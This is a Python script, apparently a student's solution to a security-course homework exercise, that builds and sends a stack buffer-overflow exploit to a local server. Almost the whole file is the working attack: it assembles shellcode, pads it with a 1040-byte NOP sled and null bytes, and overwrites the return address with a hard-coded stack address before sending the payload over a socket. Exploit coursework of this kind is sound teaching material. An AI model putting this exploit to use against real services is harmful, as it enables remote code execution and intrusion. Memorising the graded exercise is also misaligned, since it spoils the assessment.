#!/usr/bin/python

import os, socket,struct,assemble
 

HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


PATH_TO_SHELLCODE = './shellcode.asm'


def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.
    
    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''

    return assemble.assemble_file("shellcode.asm")

    # NOTE:
    # Don't delete this function - we are going to test it directly, and you are
    # going to use it directly in question 2.


def get_payload():
  
    shellcode = get_shellcode()
    intAdd = int("bfffe12c",16)
    # 0xbfffe12c is "return address"s address on the stack, the end of the code will be -30 bytes below it - it is done to make sure 
    #that when we use the stack memory (e.x "mov     [ebp-0x0C], eax") we wont override our shellcode
    #the begining of the shellcode can be calculated relativly to the address of the "return address", I also decreased by 30 more to reach nop slide
    #that begins before the code rather then the begining of the shellcode itself

    #when shellcode executes the addresses are:
    #esp 0xbfffe130
    #eip ~0xbfffdd1c (determined using shellcode size)
    #return address location on stack: 0xbfffe12c

    intAdd = intAdd - len(shellcode) - 30 - 30
    
    StrAdd =str(hex(intAdd))

  

    StrAdd = StrAdd[2:len(StrAdd)-1]

    #big contains the buffer starting address, 
  
    big = StrAdd.decode("hex")
    #the system expects binary in little-endian convention, so we need to flip the address
    

    little = big[::-1]

    #chr(144) is translated to x90 which is nop, and nop slide is created
    toInsert = chr(144) * 1040 
   
    toInsert = toInsert[:len(toInsert)-len(shellcode) -30]
    
    #the 30 bytes of chr(0) will be used for varibales of the shellcode
    toInsert = toInsert + shellcode +chr(0)*30+ little 
               
    return  struct.pack('>L', len(toInsert)) + toInsert


    # NOTE:
    # Don't delete this function - we are going to test it directly in our
    # tests, without running the main() function below.
def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
